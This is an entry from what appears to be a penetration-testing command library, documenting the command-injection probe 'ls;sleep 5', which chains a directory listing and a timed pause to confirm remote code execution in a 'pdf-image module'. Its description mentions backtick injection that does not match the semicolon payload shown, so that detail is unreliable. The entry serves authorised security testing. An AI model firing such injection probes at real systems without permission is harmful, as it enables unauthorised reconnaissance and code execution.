---
data: ls;sleep 5
tags:
  - injection
  - rce
  - recon
type: command
output: Directory listing followed by 5-second pause
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:32.570Z'
id: 2b6a2626-03dd-4b28-b295-12a9dcb0cfcc
verified: false
validated: true
submitted: true
---
# ls-and-sleep-injection

## Command

```bash
ls;sleep 5
```

## Description

This chained Unix shell command lists the current directory contents using ls, then pauses for 5 seconds with sleep, injected via backticks to exploit double-quoted contexts in the pdf-image module for visible RCE demonstration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ls | List directory files | Yes |
| sleep 5 | Pause for 5 seconds | Yes |

## Examples

### Basic Usage

```bash
ls;sleep 5
```

### Advanced Usage

```bash
ls -la;sleep 10  # Detailed listing with longer pause
```

## Expected Output

Stdout shows file/directory names from ls, then a 5-second delay with no further output, confirming both reconnaissance and injection success.

## Related

- [[Related Procedure]]
